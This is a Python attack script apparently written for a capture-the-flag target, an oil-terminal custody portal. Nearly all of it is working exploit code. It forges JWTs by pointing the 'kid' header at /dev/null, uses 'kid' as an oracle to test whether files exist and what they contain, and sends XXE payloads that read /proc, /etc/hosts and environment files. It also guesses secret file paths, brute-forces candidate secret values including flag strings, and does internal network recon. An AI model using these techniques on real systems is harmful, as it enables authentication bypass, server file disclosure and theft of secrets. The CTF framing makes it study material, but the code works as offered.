#!/usr/bin/env python3
"""round66 — Exploit kid oracle + full maps analysis + network recon"""
import requests, json, time, hashlib, hmac as hm, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged()}",
           "Content-Type": "application/xml"}

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml.encode('utf-8'), headers=AUTH_OP, timeout=15)
        if r.status_code == 200:
            data = r.json()
            return data.get("summary", {}).get(field, "")
        return f"[{r.status_code}]"
    except Exception as e:
        return f"[ERR:{e}]"

def kid_exists(path):
    """Check if file exists and is readable via kid oracle.
    Returns: 'exists' (403=exists, wrong key), 'missing' (500/error), 'unknown'"""
    token = jwt_forged(kid=path, key=b'test_nonexistent_key_12345')
    try:
        r = S.get(f"{CASPI}/api/auth/me",
                  headers={"Authorization": f"Bearer {token}"}, timeout=5)
        if r.status_code == 403:
            return "exists"  # File read succeeded but key was wrong
        elif r.status_code == 500:
            return "missing"  # File read failed (doesn't exist)
        elif r.status_code == 200:
            return "valid!"  # Somehow our test key matched (file contains 'test_nonexistent_key_12345')
        else:
            return f"[{r.status_code}]"
    except Exception as e:
        return f"[err:{e}]"

def kid_verify(path, content_bytes):
    """Verify that a file contains exactly the given content using kid oracle."""
    for suffix in [b'', b'\n']:
        key = content_bytes + suffix
        token = jwt_forged(kid=path, key=key)
        try:
            r = S.get(f"{CASPI}/api/auth/me",
                      headers={"Authorization": f"Bearer {token}"}, timeout=5)
            if r.status_code == 200:
                return True, suffix
        except:
            pass
    return False, None

# ============================================================
print("="*70)
print("PHASE 1: FULL /proc/self/maps — FIND /app/ FILES")
print("="*70)

maps_content = xxe_read("/proc/self/maps")
if not maps_content.startswith("["):
    lines = maps_content.split('\n')
    print(f"  Total: {len(lines)} lines, {len(maps_content)} bytes")

    # Extract all unique file paths
    file_paths = set()
    for line in lines:
        parts = line.strip().split()
        if len(parts) >= 6:
            path = parts[-1]
            if path.startswith('/'):
                file_paths.add(path)

    print(f"\n  Unique mapped files: {len(file_paths)}")
    for fp in sorted(file_paths):
        marker = ""
        if "/app/" in fp:
            marker = " *** APP FILE ***"
        elif "site-packages" in fp and "lxml" not in fp and "charset" not in fp:
            marker = " (site-pkg)"
        if marker or "/app/" in fp:
            print(f"    {fp}{marker}")

    print(f"\n  ALL mapped files:")
    for fp in sorted(file_paths):
        print(f"    {fp}")
else:
    print(f"  Failed to read maps: {maps_content[:200]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: kid ORACLE — FILE EXISTENCE CHECK FOR SECRET FILES")
print("="*70)

secret_paths = [
    # Probe secret specific
    "/app/probe_secret",
    "/app/probe_secret.txt",
    "/app/probe.key",
    "/app/probe.secret",
    "/app/.probe_secret",
    "/app/secrets/probe",
    "/app/secrets/probe_secret",
    "/app/config/probe_secret",
    "/app/keys/probe",
    "/app/keys/probe_secret",
    "/app/keys/hmac",
    "/app/keys/signing",
    "/app/keys/secret",
    # Environment / config
    "/app/.env",
    "/app/.env.local",
    "/app/config.py",
    "/app/config.json",
    "/app/settings.py",
    "/app/settings.json",
    "/app/secrets.json",
    "/app/secret.key",
    "/app/.secret",
    # Docker secrets
    "/run/secrets/probe_secret",
    "/run/secrets/PROBE_SECRET",
    "/run/secrets/hmac_key",
    "/run/secrets/signing_key",
    "/run/secrets/secret",
    # Other
    "/etc/probe_secret",
    "/opt/probe_secret",
    "/var/probe_secret",
    "/tmp/probe_secret",
    "/root/.probe_secret",
    "/root/probe_secret",
    # Alternative app paths
    "/app/probe.py",
    "/app/routes.py",
    "/app/ops.py",
    "/app/api.py",
    "/app/views.py",
    "/app/utils.py",
    "/app/helpers.py",
    "/app/signing.py",
    "/app/hmac_utils.py",
    "/app/middleware.py",
    "/app/decorators.py",
    # Potential loaded modules not in maps
    "/app/config/__init__.py",
    "/app/api/__init__.py",
    "/app/ops/__init__.py",
]

for path in secret_paths:
    result = kid_exists(path)
    if result == "exists":
        print(f"  EXISTS: {path}")
    elif result == "valid!":
        print(f"  *** CONTENT MATCH: {path} ***")
    elif result != "missing":
        print(f"  {result}: {path}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: kid ORACLE — VERIFY KNOWN FILES")
print("="*70)
print("  Confirming oracle behavior with known files")

# Test 1: /dev/null → empty content
ok, suf = kid_verify("/dev/null", b'')
print(f"  /dev/null with empty key: {'OK' if ok else 'FAIL'} (suffix={suf!r})")

# Test 2: Nonexistent file
result = kid_exists("/nonexistent/file/path")
print(f"  /nonexistent/file: {result}")

# Test 3: /app/app.py exists?
result = kid_exists("/app/app.py")
print(f"  /app/app.py: {result}")

# Test 4: /proc/self/environ exists?
result = kid_exists("/proc/self/environ")
print(f"  /proc/self/environ: {result}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: PROBE RESPONSE DETAILS")
print("="*70)
print("  Checking probe response for headers and metadata")

# Make a probe request and check full response
probe_data = {
    "url": "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
    "sig": "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
}

auth_op_json = {"Authorization": f"Bearer {jwt_forged()}",
                "Content-Type": "application/json"}

try:
    r = S.post(f"{CASPI}/api/ops/probe", json=probe_data,
              headers=auth_op_json, timeout=10)
    print(f"  Status: {r.status_code}")
    print(f"  Headers:")
    for k, v in r.headers.items():
        print(f"    {k}: {v}")
    print(f"  Body: {r.text[:500]}")

    # Check if response wraps the gauge data or returns raw
    try:
        data = r.json()
        print(f"  JSON keys: {list(data.keys())}")
        print(f"  Full JSON: {json.dumps(data, indent=2)[:500]}")
    except:
        pass
except Exception as e:
    print(f"  Error: {e}")

# Try all 5 probe URLs
print(f"\n  All probe responses:")
probes = [
    ("lm-01", "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
     "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"),
    ("tk-01", "http://gauge-gw.internal:9100/v1/tanks/1/level",
     "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"),
    ("tk-02", "http://gauge-gw.internal:9100/v1/tanks/2/level",
     "0e996e2ff657529641db10233f9f863a846e06b178c6ad37908185a190a66197"),
    ("tk-03", "http://gauge-gw.internal:9100/v1/tanks/3/level",
     "c0a3f9ef039f26fe9a8bcfb41b71427587dc88dc0ef600b1c49488b072f2c9d3"),
    ("tk-07", "http://gauge-gw.internal:9100/v1/tanks/7/level",
     "447a4c0f1fa7769cdfb2b67842364d8b699b5e85a5b2784524146f7a5af5132f"),
]

for name, url, sig in probes:
    try:
        r = S.post(f"{CASPI}/api/ops/probe",
                  json={"url": url, "sig": sig},
                  headers=auth_op_json, timeout=10)
        print(f"  {name}: [{r.status_code}] {r.text[:200]}")
    except Exception as e:
        print(f"  {name}: ERROR {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: READ /proc/mounts AND /proc/self/mountinfo")
print("="*70)

for path in ["/proc/mounts", "/proc/self/mounts", "/proc/self/mountinfo",
             "/proc/1/mounts", "/proc/1/mountinfo"]:
    content = xxe_read(path)
    if not content.startswith("["):
        lines = content.split('\n')
        print(f"\n  {path}: ({len(content)} bytes, {len(lines)} lines)")
        for line in lines[:50]:
            print(f"    {line}")
        if len(lines) > 50:
            print(f"    ... ({len(lines)-50} more)")
    else:
        print(f"  {path}: {content[:100]}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: NETWORK RECON — 172.18.0.4")
print("="*70)

# Read /etc/hosts for any new entries
content = xxe_read("/etc/hosts")
print(f"  /etc/hosts: {content}")

# Read resolv.conf for DNS info
content = xxe_read("/etc/resolv.conf")
print(f"  /etc/resolv.conf: {content}")

# Try reading Docker's hostname file for other containers
for path in ["/etc/hostname",
             "/proc/self/net/arp",  # Already got this, but refresh
             "/proc/self/net/fib_trie"]:
    content = xxe_read(path)
    if not content.startswith("["):
        print(f"\n  {path}:")
        for line in content.split('\n')[:20]:
            print(f"    {line}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: kid ORACLE BRUTE-FORCE SMALL SECRET FILES")
print("="*70)
print("  If PROBE_SECRET is in a small file, we can brute-force via kid")
print("  Testing targeted passwords via kid=/app/probe_secret (if exists)")

# First check which potential secret files exist
potential_secret_files = []
for path in ["/app/probe_secret", "/app/probe.key", "/app/.probe_secret",
             "/app/keys/probe", "/app/keys/probe_secret",
             "/run/secrets/probe_secret", "/app/secret.key"]:
    result = kid_exists(path)
    if result == "exists":
        potential_secret_files.append(path)
        print(f"  FILE EXISTS: {path}")

if potential_secret_files:
    print(f"\n  Brute-forcing content of found secret files...")
    # Try common passwords as file content
    candidates = [
        "probe_secret", "PROBE_SECRET", "secret", "password",
        "changeme", "admin", "probe", "caspiterminal",
        "khs-oil-depot", "gauge-gw", "terminal",
        "c8142af02727b3d7d51e4aece866104b",
        "c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95",
        "KHS{c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95}",
        "STF{c8142af02727b3d7d51e4aece866104b}",
        "llehs", "shell", "LLEHS", "SHELL",
        "kazhackstan", "KazHackStan", "CTF",
    ]

    for sf in potential_secret_files:
        for c in candidates:
            ok, suf = kid_verify(sf, c.encode())
            if ok:
                print(f"  *** FOUND: {sf} contains '{c}' (suffix={suf!r}) ***")

                # Now test as PROBE_SECRET!
                test_url = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
                expected_sig = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

                for key_variant in [c.encode(), (c+'\n').encode()]:
                    computed = hm.new(key_variant, test_url, hashlib.sha256).hexdigest()
                    if computed == expected_sig:
                        print(f"  *** PROBE_SECRET = '{c}' (variant={key_variant!r}) ***")
                        print(f"  *** THIS IS THE PROBE SECRET! ***")
else:
    print("  No secret files found via kid oracle")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: EXPLORE /app/ DIRECTORY STRUCTURE via kid ORACLE")
print("="*70)
print("  Mapping all files under /app/ to find missed modules")

app_paths = [
    # Python source files
    "/app/__init__.py",
    "/app/main.py",
    "/app/wsgi.py",
    "/app/asgi.py",
    "/app/run.py",
    "/app/server.py",
    "/app/flask_app.py",
    "/app/create_app.py",
    "/app/factory.py",
    # Route modules
    "/app/routes/__init__.py",
    "/app/api/__init__.py",
    "/app/ops/__init__.py",
    "/app/auth/__init__.py",
    "/app/blueprints/__init__.py",
    "/app/views/__init__.py",
    # Other modules
    "/app/models.py",
    "/app/schemas.py",
    "/app/forms.py",
    "/app/middleware.py",
    "/app/decorators.py",
    "/app/signing.py",
    "/app/hmac_utils.py",
    "/app/crypto.py",
    "/app/security.py",
    "/app/probe.py",
    "/app/custody.py",
    "/app/portal.py",
    "/app/ops.py",
    "/app/utils.py",
    "/app/helpers.py",
    "/app/constants.py",
    "/app/settings.py",
    "/app/config.py",
    "/app/extensions.py",
    # Config files
    "/app/Dockerfile",
    "/app/docker-compose.yml",
    "/app/docker-compose.yaml",
    "/app/Makefile",
    "/app/setup.py",
    "/app/pyproject.toml",
    "/app/Pipfile",
    "/app/Pipfile.lock",
    "/app/poetry.lock",
    # Templates (additional)
    "/app/templates/portal.html",
    "/app/templates/ops.html",
    "/app/templates/custody.html",
    "/app/templates/probe.html",
    "/app/templates/error.html",
    "/app/templates/403.html",
    "/app/templates/404.html",
    "/app/templates/500.html",
    # Static
    "/app/static/js/app.js",
    "/app/static/js/main.js",
    "/app/static/js/portal.js",
    # Pycache
    "/app/__pycache__/config.cpython-311.pyc",
    "/app/__pycache__/routes.cpython-311.pyc",
    "/app/__pycache__/models.cpython-311.pyc",
    "/app/__pycache__/utils.cpython-311.pyc",
    "/app/__pycache__/probe.cpython-311.pyc",
    "/app/__pycache__/signing.cpython-311.pyc",
    "/app/__pycache__/ops.cpython-311.pyc",
    "/app/__pycache__/custody.cpython-311.pyc",
    "/app/__pycache__/middleware.cpython-311.pyc",
    "/app/__pycache__/helpers.cpython-311.pyc",
]

found_files = []
for path in app_paths:
    result = kid_exists(path)
    if result == "exists":
        found_files.append(path)
        print(f"  EXISTS: {path}")
    elif result == "valid!":
        print(f"  *** CONTENT='test_nonexistent_key_12345': {path} ***")

print(f"\n  Found {len(found_files)} files under /app/")

# Try to read found files via XXE
for fp in found_files:
    if not fp.endswith('.pyc'):
        content = xxe_read(fp)
        if not content.startswith("["):
            print(f"\n  {fp} ({len(content)} bytes):")
            for line in content.split('\n')[:20]:
                print(f"    {line}")
        else:
            print(f"  {fp}: {content[:100]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
